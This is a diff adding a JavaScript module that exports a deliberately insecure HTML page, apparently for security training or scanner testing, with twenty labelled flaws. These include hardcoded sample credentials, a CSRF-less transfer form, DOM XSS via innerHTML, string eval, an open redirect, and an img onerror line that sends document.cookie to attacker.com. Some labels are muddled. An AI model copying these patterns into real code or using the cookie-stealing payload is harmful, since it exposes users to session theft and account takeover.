@@ -1,0 +1,141 @@
+// ⚠️ VULNERABILITY: Frontend HTML with vulnerable features
+
+const html = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Vulnerable Web App</title>
+    <!-- ⚠️ VULNERABILITY 1: No Content Security Policy header -->
+    <!-- Should have: <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> -->
+    
+    <!-- ⚠️ VULNERABILITY 2: Inline scripts (CSP violation) -->
+    <script>
+        // API key exposed in frontend code
+        const API_KEY = 'sk-1234567890abcdefg';
+        const SECRET = 'my-secret-value';
+        
+        // Hardcoded credentials
+        const USERNAME = 'admin';
+        const PASSWORD = 'admin123';
+    </script>
+</head>
+<body>
+    <h1>Welcome to Vulnerable App</h1>
+
+    <!-- ⚠️ VULNERABILITY 3: Form without CSRF protection -->
+    <form id="transferForm" method="POST" action="/api/transfer-funds">
+        <!-- No CSRF token field -->
+        <input type="text" name="fromAccount" placeholder="From Account">
+        <input type="text" name="toAccount" placeholder="To Account">
+        <input type="text" name="amount" placeholder="Amount">
+        <button type="submit">Transfer</button>
+    </form>
+
+    <!-- ⚠️ VULNERABILITY 4: Inline event handlers (XSS vulnerable) -->
+    <div onclick="handleClick(event)">Click me</div>
+    <img src="image.jpg" onerror="fetch('https://attacker.com/steal?cookie=' + document.cookie)">
+
+    <!-- ⚠️ VULNERABILITY 5: Dangerous HTML attributes -->
+    <a href="javascript:alert('XSS')">Click here</a>
+    <div data-user-input="<script>alert('XSS')</script>"></div>
+
+    <!-- ⚠️ VULNERABILITY 6: Comment with sensitive info -->
+    <!-- Database password: db_pass_123 -->
+    <!-- API endpoint: http://internal-api.local:8080 -->
+    <!-- Admin panel: /admin/secret_panel -->
+
+    <div id="userContent"></div>
+
+    <script>
+        // ⚠️ VULNERABILITY 7: Direct DOM manipulation with user data
+        const userInput = new URLSearchParams(window.location.search).get('name');
+        document.getElementById('userContent').innerHTML = userInput;
+        // If userInput = "<img src=x onerror=alert('XSS')>"
+        // XSS executed
+
+        // ⚠️ VULNERABILITY 8: localStorage usage (XSS vulnerable)
+        function saveCredentials() {
+            localStorage.setItem('username', document.getElementById('username').value);
+            localStorage.setItem('password', document.getElementById('password').value);
+            localStorage.setItem('apiKey', API_KEY);
+            // Exposed to any XSS attack
+        }
+
+        // ⚠️ VULNERABILITY 9: Fetch requests with credentials
+        function fetchUserData() {
+            const url = '/api/user/' + document.getElementById('userId').value;
+            fetch(url, {
+                method: 'GET',
+                credentials: 'include' // Sends cookies automatically
+                // No token in header, only relies on cookies
+            })
+            .then(r => r.json())
+            .then(data => {
+                // ⚠️ VULNERABILITY 10: Direct HTML injection of response
+                document.body.innerHTML += data.htmlContent;
+            });
+        }
+
+        // ⚠️ VULNERABILITY 11: Using eval-like functions
+        function executeUserCode() {
+            const code = document.getElementById('codeInput').value;
+            setTimeout(code, 1000); // setTimeout with string is like eval
+            // or: new Function(code)()
+        }
+
+        // ⚠️ VULNERABILITY 12: JSONP (old vulnerability)
+        function loadData() {
+            const script = document.createElement('script');
+            script.src = 'https://api.example.com/data?callback=handleData&user=' + userId;
+            document.body.appendChild(script);
+            // Vulnerable to CSRF and callback manipulation
+        }
+
+        // ⚠️ VULNERABILITY 13: No SameSite cookie handling
+        // Cookies sent on cross-site requests (CSRF vulnerability)
+
+        // ⚠️ VULNERABILITY 14: Reflected XSS in console
+        console.log('User searched for: ' + userInput);
+        // Developers might copy-paste from console into other contexts
+
+        // ⚠️ VULNERABILITY 15: Dangerous window operations
+        function redirectBasedOnParam() {
+            const redirect = new URLSearchParams(window.location.search).get('url');
+            window.location = redirect;
+            // Open redirect vulnerability
+        }
+    </script>
+
+    <!-- ⚠️ VULNERABILITY 16: External scripts with no integrity check -->
+    <script src="https://cdn.example.com/library.js"></script>
+    <!-- No integrity attribute - vulnerable to CDN compromise -->
+
+    <!-- ⚠️ VULNERABILITY 17: Unvalidated form action -->
+    <form action="user_input_form_action">
+        <!-- Form target can be user-controlled -->
+    </form>
+
+    <!-- ⚠️ VULNERABILITY 18: Iframe injection -->
+    <div id="iframeContainer"></div>
+    <script>
+        const iframeSrc = new URLSearchParams(window.location.search).get('iframe');
+        document.getElementById('iframeContainer').innerHTML = 
+            '<iframe src="' + iframeSrc + '"></iframe>';
+        // Could load malicious content
+    </script>
+
+    <!-- ⚠️ VULNERABILITY 19: Missing autocomplete="off" on sensitive fields -->
+    <input type="password" name="password">
+    <!-- Browser may autocomplete with old password -->
+
+    <!-- ⚠️ VULNERABILITY 20: No novalidate on forms -->
+    <form id="loginForm" novalidate>
+        <!-- Server-side validation might be bypassed -->
+        <input type="email" name="email">
+        <input type="password" name="password">
+    </form>
+</body>
+</html>
+`;
+
+module.exports = html;
